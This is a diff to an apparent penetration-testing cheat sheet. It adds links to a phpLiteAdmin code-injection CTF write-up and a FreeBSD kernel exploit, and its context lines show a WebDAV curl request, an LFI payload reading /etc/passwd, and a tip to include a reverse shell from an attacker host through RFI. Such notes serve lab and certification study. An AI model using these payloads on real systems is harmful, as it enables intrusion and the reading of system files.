@@ -108,6 +108,10 @@ $ curl -v -X MOVE -H 'Destination: http://10.11.1.13/[new]' 'http://10.11.1.13/[
 Apache
 * Log paths: https://wiki.apache.org/httpd/DistrosDefaultLayout
 
+phpLiteAdmin 1.9.3 Remote PHP Code Injection:
+* https://v3ded.github.io/ctf/zico2.html
+
+
 LFI / RFI
 (LFI = HIGH CHANCE OF RFI, SO TRY TO INCLUDE HTTP://ATTACKER/RSHELL.PHP)
 ```
@@ -120,6 +124,11 @@ http://example.com/index.php?page=../../../etc/passwd%00%en
 PHP
 * Check `phpinfo()`
 * RFI: If reverse-shell doesn't work, include `<?php phpinfo();?>` to check for banned functions
+
+## Kernel Exploits
+
+FreeBSD 9.0
+* FreeBSD 9.0 - Intel SYSRET: https://www.exploit-db.com/exploits/28718
 
 ## Privesc - LINUX
 
